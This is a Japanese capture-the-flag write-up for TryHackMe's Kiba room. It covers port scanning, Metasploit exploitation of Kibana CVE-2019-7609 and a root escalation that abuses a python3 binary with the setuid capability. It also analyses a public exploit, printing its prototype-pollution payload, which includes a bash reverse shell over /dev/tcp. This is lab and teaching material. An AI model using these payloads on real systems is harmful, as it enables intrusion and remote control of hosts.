# Kiba CTF

https://tryhackme.com/room/kiba

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.168.107
root@ip-10-10-239-143:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-15 23:19 GMT
Nmap scan report for 10.10.168.107
Host is up (0.015s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5601/tcp open  esmagent
MAC Address: 02:51:FE:6A:35:B9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds

root@ip-10-10-239-143:~# sudo nmap -sV -p22,80,5601 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-15 23:21 GMT
Nmap scan report for 10.10.168.107
Host is up (0.0035s latency).

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http      Apache httpd 2.4.18 ((Ubuntu))
5601/tcp open  esmagent?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

- 5601をブラウザで表示したら、Kibanaのダッシュボード
- Managementメニューから、バージョンは6.5.4
- CVE-2019-7609 RCE脆弱性がある  
https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability

## CVE-2019-7609

metasploit

```shell
msf6 exploit(linux/http/kibana_timelion_prototype_pollution_rce) > set RHOSTS 10.10.168.107
RHOSTS => 10.10.168.107
msf6 exploit(linux/http/kibana_timelion_prototype_pollution_rce) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/http/kibana_timelion_prototype_pollution_rce) > exploit

[*] Started reverse TCP handler on 10.2.22.182:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Exploitable Version Detected: 6.5.4
[*] Polluting Prototype in Timelion
[*] Trigginger payload execution via canvas socket
[*] Waiting for shells
[*] Unsetting to stop raining shells from a lacerated kibana
[*] Unsetting to stop raining shells from a lacerated kibana
[*] Command shell session 1 opened (10.2.22.182:4444 -> 10.10.168.107:39744) at 2025-03-15 19:29:43 -0400
```

セッションオープン成功。

```shell
kiba@ubuntu:/home/kiba/kibana/bin$ ls -al /home/kiba
ls -al /home/kiba
total 111064
drwxr-xr-x  6 kiba kiba      4096 Mar 15 16:29 .
drwxr-xr-x  3 root root      4096 Mar 31  2020 ..
-rw-rw-r--  1 kiba kiba    407592 Mar 15 16:29 .babel.json
-rw-------  1 kiba kiba      9605 Mar 31  2020 .bash_history
-rw-r--r--  1 kiba kiba       220 Mar 31  2020 .bash_logout
-rw-r--r--  1 kiba kiba      3771 Mar 31  2020 .bashrc
drwx------  2 kiba kiba      4096 Mar 31  2020 .cache
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .hackmeplease
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .nano
-rw-r--r--  1 kiba kiba       655 Mar 31  2020 .profile
-rw-r--r--  1 kiba kiba         0 Mar 31  2020 .sudo_as_admin_successful
-rw-r--r--  1 root root       176 Mar 31  2020 .wget-hsts
-rw-rw-r--  1 kiba kiba 113259798 Dec 19  2018 elasticsearch-6.5.4.deb
drwxrwxr-x 11 kiba kiba      4096 Dec 17  2018 kibana
-rw-rw-r--  1 kiba kiba        35 Mar 31  2020 user.txt
```

```shell
kiba@ubuntu:/home/kiba/kibana/bin$ cat /home/kiba/user.txt
cat /home/kiba/user.txt
THM{...................}
```

ユーザーフラグゲット。

## 権限昇格

質問文で capability に言及しているので調べる。

```shell
kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

エクスプロイト

```shell
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

ルートシェル取得成功

```shell
# id
id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

```shell
# ls -al /root
ls -al /root
total 28
drwx------  4 root root 4096 Mar 31  2020 .
drwxr-xr-x 22 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Mar 31  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   45 Mar 31  2020 root.txt
drwxr-xr-x  2 root root 4096 Mar 31  2020 ufw
# cat /root/root.txt
cat /root/root.txt
THM{....................}
```

ルートフラグゲット！

## 振り返り

質問文の流れに従えば簡単で、学ぶ部分が無かったので、エクスプロイトコードの解析を行う。  
https://github.com/LandGrey/CVE-2019-7609/blob/master/CVE-2019-7609-kibana-rce.py

下記の data を "/api/timelion/run" に Postしてリバースシェルを取得している。

```python
data = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ];then touch /tmp/%s && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\'; fi\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}''' % (random_name, random_name, ip, port)
```

.es は Timelionのクエリ であり、Elasticsearch からデータを取得するための構文。取得したデータ自体に意味はない。

```python
.es(*)
```

.props は Timelion（Kibana）の関数 で、グラフのプロパティを設定するために使われる。通常は下記のような形でプロパティを設定する。

```python
.es(*).props(label='CPU Usage', color='red')
```

しかし、エクスプロイトコードでは、label の ```__proto__.env``` を介して環境変数にアクセスすることにより、

１．環境変数「AAAA」に javascript のリバースシェルコードの文字列を設定している。

```python
.props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ];then touch /tmp/%s && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\'; fi\");process.exit()//')
```

２．環境変数「NODE_OPTIONS」に '--require /proc/self/environ' 文字列を設定している。これにより、Node.js 実行時に環境変数のリストが入った /proc/self/environ が require される。

```python
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

Node.js の require は、js ならNode.jsアドオンとしてロードし、JSONならパースする。また、テキストファイルの場合は javascript として実行しようとする。

ここで、環境変数 AAAA には js コードの文字列が設定されているため、Node.js 実行時にリバースシェルの子プロセスが生成されるという仕組みになっている。
